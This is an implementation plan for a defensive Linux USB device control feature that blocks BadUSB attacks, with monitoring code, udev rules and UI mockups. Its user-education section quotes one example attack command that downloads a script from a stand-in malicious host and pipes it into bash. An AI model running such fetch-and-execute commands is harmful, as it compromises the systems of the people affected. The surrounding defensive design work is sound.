# 🔌 USB Device Control - Implementation Plan

**Module**: USB Device Control
**Target Version**: v1.5.0
**Status**: 📋 Planning
**Priority**: High (unique differentiator)

---

## 🎯 Goals

1. **Protect against BadUSB attacks** — Malicious USB devices that impersonate keyboards
2. **Give users visibility** — Know what USB devices connect to your system
3. **Educate users** — Explain *why* this matters (public charging, unknown devices)
4. **Simple UX** — Allow/Block prompts similar to firewall popups

---

## 🔍 The Threat: Why This Matters

### BadUSB Attacks
- USB devices can claim to be keyboards and type malicious commands
- Attacks happen in <3 seconds after insertion
- Used in: targeted attacks, "lost" USB drives, public charging stations
- **No protection exists on Linux desktop** — enterprise Windows has USB control

### Real-World Examples
- "USB Rubber Ducky" — $50 device that types payloads
- Malicious phone chargers that inject keystrokes
- "Dropped" USB drives in parking lots (social engineering)

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                         USER SPACE                          │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────────┐    ┌─────────────────────────────┐    │
│  │  Bastion GUI    │◄───│  USB Prompt Dialog          │    │
│  │  (System Tray)  │    │  "New device - Allow?"      │    │
│  └────────▲────────┘    └─────────────────────────────┘    │
│           │                                                  │
│  ┌────────┴────────┐    ┌─────────────────────────────┐    │
│  │  Bastion Daemon │◄───│  USB Monitor Thread         │    │
│  │                 │    │  (pyudev listener)          │    │
│  └────────▲────────┘    └─────────────────────────────┘    │
│           │                                                  │
│  ┌────────┴────────────────────────────────────────────┐   │
│  │  USB Device Database (JSON)                          │   │
│  │  ~/.config/bastion/usb_devices.json                  │   │
│  └──────────────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────────────┤
│                        KERNEL SPACE                          │
├─────────────────────────────────────────────────────────────┤
│  ┌──────────────────────────────────────────────────────┐   │
│  │  udev rules: /etc/udev/rules.d/99-bastion-usb.rules  │   │
│  │  → Authorize/deauthorize USB devices                  │   │
│  └──────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## 📦 Components

### 1. USB Monitor (`bastion/usb_monitor.py`)

```python
# Core functionality:
class USBMonitor:
    def __init__(self, callback):
        self.context = pyudev.Context()
        self.monitor = pyudev.Monitor.from_netlink(self.context)
        self.monitor.filter_by(subsystem='usb')
        self.callback = callback  # Called on new device

    def start(self):
        """Start monitoring in background thread"""
        observer = pyudev.MonitorObserver(self.monitor, self._handle_event)
        observer.start()

    def _handle_event(self, action, device):
        if action == 'add' and device.device_type == 'usb_device':
            self.callback(USBDeviceInfo.from_udev(device))
```

### 2. Device Info (`bastion/usb_device.py`)

```python
@dataclass
class USBDeviceInfo:
    vendor_id: str      # e.g., "046d" (Logitech)
    product_id: str     # e.g., "c52b"
    vendor_name: str    # e.g., "Logitech, Inc."
    product_name: str   # e.g., "Unifying Receiver"
    serial: str         # Unique serial number (if available)
    device_class: str   # e.g., "HID", "Mass Storage", "Hub"
    bus_id: str         # e.g., "1-2.3"
    is_keyboard: bool   # True if claims to be keyboard/HID
    is_storage: bool    # True if mass storage

    @property
    def unique_id(self) -> str:
        """Unique identifier for this exact device"""
        return f"{self.vendor_id}:{self.product_id}:{self.serial or 'no-serial'}"

    @property
    def model_id(self) -> str:
        """Identifier for this model (ignores serial)"""
        return f"{self.vendor_id}:{self.product_id}"
```

### 3. Device Database (`bastion/usb_rules.py`)

```python
class USBRuleManager:
    DB_PATH = Path.home() / '.config/bastion/usb_devices.json'

    def __init__(self):
        self.rules = self._load()

    def get_verdict(self, device: USBDeviceInfo) -> str:
        """Returns: 'allow', 'block', or 'unknown'"""
        # Check exact device first (by serial)
        if device.unique_id in self.rules:
            return self.rules[device.unique_id]['verdict']
        # Check model (any device of this type)
        if device.model_id in self.rules:
            return self.rules[device.model_id]['verdict']
        return 'unknown'

    def add_rule(self, device: USBDeviceInfo, verdict: str, scope: str):
        """scope: 'device' (this exact device) or 'model' (all of this type)"""
        key = device.unique_id if scope == 'device' else device.model_id
        self.rules[key] = {
            'verdict': verdict,
            'vendor_name': device.vendor_name,
            'product_name': device.product_name,
            'added': datetime.now().isoformat(),
            'scope': scope
        }
        self._save()
```

### 4. USB Authorization Control

```python
class USBAuthorizer:
    """Control USB device authorization via sysfs"""

    @staticmethod
    def authorize(bus_id: str):
        """Allow the device to function"""
        auth_path = f"/sys/bus/usb/devices/{bus_id}/authorized"
        Path(auth_path).write_text("1")

    @staticmethod
    def deauthorize(bus_id: str):
        """Block the device from functioning"""
        auth_path = f"/sys/bus/usb/devices/{bus_id}/authorized"
        Path(auth_path).write_text("0")
```

---

## 🖥️ User Interface

### Prompt Dialog (New Unknown Device)

```
┌─────────────────────────────────────────────────────────┐
│  🔌 New USB Device Detected                             │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Device: Logitech Unifying Receiver                     │
│  Type:   Keyboard/Mouse (HID)                           │
│  Vendor: Logitech, Inc.                                 │
│                                                          │
│  ⚠️  This device claims to be a keyboard.               │
│     Malicious devices can type commands automatically.  │
│                                                          │
│  ┌────────────────────────────────────────────────────┐ │
│  │ ○ Allow this device only                           │ │
│  │ ○ Allow all Logitech Unifying Receivers            │ │
│  │ ○ Block this device                                │ │
│  └────────────────────────────────────────────────────┘ │
│                                                          │
│            [ Cancel ]              [ Apply ]             │
└─────────────────────────────────────────────────────────┘
```

### Control Panel Tab

```
┌─────────────────────────────────────────────────────────┐
│  USB Device Control                              [Gear] │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Protection: ● Enabled  ○ Disabled                      │
│                                                          │
│  ┌─────────────────────────────────────────────────────┐│
│  │ Allowed Devices                                     ││
│  ├─────────────────────────────────────────────────────┤│
│  │ ✅ Logitech Unifying Receiver (HID)     [Remove]   ││
│  │ ✅ SanDisk Ultra USB 3.0 (Storage)      [Remove]   ││
│  │ ✅ All Apple devices (Model)            [Remove]   ││
│  └─────────────────────────────────────────────────────┘│
│                                                          │
│  ┌─────────────────────────────────────────────────────┐│
│  │ Blocked Devices                                     ││
│  ├─────────────────────────────────────────────────────┤│
│  │ 🚫 Unknown HID Device (046d:beef)       [Remove]   ││
│  └─────────────────────────────────────────────────────┘│
│                                                          │
│  ┌─────────────────────────────────────────────────────┐│
│  │ Recent Activity                                     ││
│  ├─────────────────────────────────────────────────────┤│
│  │ 14:32 - Logitech Mouse connected (allowed)         ││
│  │ 14:28 - SanDisk USB connected (allowed)            ││
│  │ 09:15 - Unknown device blocked (HID pretending)    ││
│  └─────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────┘
```

---

## 📋 Implementation Phases

### Phase 1: Core Detection (Week 1)
- [ ] Create `bastion/usb_monitor.py` with pyudev integration
- [ ] Create `bastion/usb_device.py` with USBDeviceInfo dataclass
- [ ] Add USB monitoring thread to daemon
- [ ] Test: detect USB insertions and log to console
- [ ] Dependency: Add `pyudev` to requirements.txt

### Phase 2: Rules & Authorization (Week 2)
- [ ] Create `bastion/usb_rules.py` for device database
- [ ] Implement sysfs authorization control
- [ ] Create udev rule template for Bastion
- [ ] Handle "default deny" for unknown HID devices
- [ ] Test: block/allow devices based on rules

### Phase 3: GUI Integration (Week 3)
- [ ] Create USB prompt dialog (PyQt6)
- [ ] Add USB tab to Control Panel
- [ ] Integrate with existing IPC (daemon → GUI)
- [ ] Add USB status to system tray tooltip
- [ ] Test: full flow from insertion to decision

### Phase 4: Polish & Education (Week 4)
- [ ] Add "Why this matters" explanations in UI
- [ ] Implement device history/logging
- [ ] Add "Currently connected" device list
- [ ] Write user documentation
- [ ] Test: full user experience review

---

## 🔧 Technical Details

### Dependencies
```bash
# Add to requirements.txt
pyudev>=0.24.0  # Linux udev bindings
```

### udev Rule (installed by package)
```bash
# /etc/udev/rules.d/99-bastion-usb.rules
# Notify Bastion daemon when USB devices are added
ACTION=="add", SUBSYSTEM=="usb", ENV{DEVTYPE}=="usb_device", \
    RUN+="/usr/bin/bastion-usb-notify add %k"

# For HID devices (keyboards, mice), default to unauthorized
# Bastion will authorize after user approval
ACTION=="add", SUBSYSTEM=="usb", ATTR{bInterfaceClass}=="03", \
    ATTR{authorized}="0"
```

### Device Classes to Watch
```python
USB_CLASS_HID = 0x03          # Human Interface Device (keyboard, mouse)
USB_CLASS_MASS_STORAGE = 0x08 # USB drives
USB_CLASS_WIRELESS = 0xE0     # Bluetooth, WiFi adapters
USB_CLASS_HUB = 0x09          # USB hubs (less risky)
```

### Security Considerations

1. **Race Condition**: BadUSB can type in <3 seconds
   - Solution: Default-deny HID devices until approved
   - Use udev rule to deauthorize at kernel level

2. **Privileged Operations**: Authorizing USB requires root
   - Solution: Daemon runs as root, handles authorization
   - GUI prompts user, sends decision via IPC

3. **Bypass Prevention**: User might uninstall Bastion
   - Solution: udev rules remain until explicitly removed
   - Clear warning during uninstall

### Data Storage

```json
// ~/.config/bastion/usb_devices.json
{
  "046d:c52b:1234567890": {
    "verdict": "allow",
    "vendor_name": "Logitech, Inc.",
    "product_name": "Unifying Receiver",
    "scope": "device",
    "added": "2024-12-23T14:30:00",
    "last_seen": "2024-12-23T14:30:00"
  },
  "05ac:12a8": {
    "verdict": "allow",
    "vendor_name": "Apple, Inc.",
    "product_name": "iPhone",
    "scope": "model",
    "added": "2024-12-20T09:00:00"
  }
}
```

---

## 🧪 Testing Plan

### Manual Tests
1. Insert known USB keyboard → Should prompt, then work after allow
2. Insert USB storage → Should prompt (lower priority than HID)
3. Insert USB hub → Should allow automatically (low risk)
4. Insert unknown HID → Should block until explicitly allowed
5. Reboot with device connected → Should remember decision

### Automated Tests
- [ ] `test_usb_monitor.py` - Device detection
- [ ] `test_usb_rules.py` - Rule matching logic
- [ ] `test_usb_authorizer.py` - sysfs interaction (mock)

---

## 📚 User Education (In-App)

### "Why Block Unknown USB?"
> **Did you know?** Malicious USB devices can pretend to be keyboards and type
> commands faster than you can react. This is called a "BadUSB" attack.
>
> Bastion protects you by asking permission before any new keyboard or
> input device can start working.

### "What is a HID Device?"
> HID stands for "Human Interface Device" — keyboards, mice, game controllers.
> These are the most dangerous USB devices because they can type commands.
> A malicious USB drive that pretends to be a keyboard can type:
> `curl evil.com/malware.sh | bash` in under 3 seconds.

---

## 📈 Success Metrics

- [ ] Blocks unknown HID devices by default
- [ ] User can allow/block in <5 seconds
- [ ] No false positives for common devices (Logitech, Apple, etc.)
- [ ] Clear education about why this matters
- [ ] Zero impact on legitimate USB workflow after initial setup

---

**Last Updated**: 2024-12-23
**Author**: Bastion Team
**Target Release**: v1.5.0 (Q1 2025)

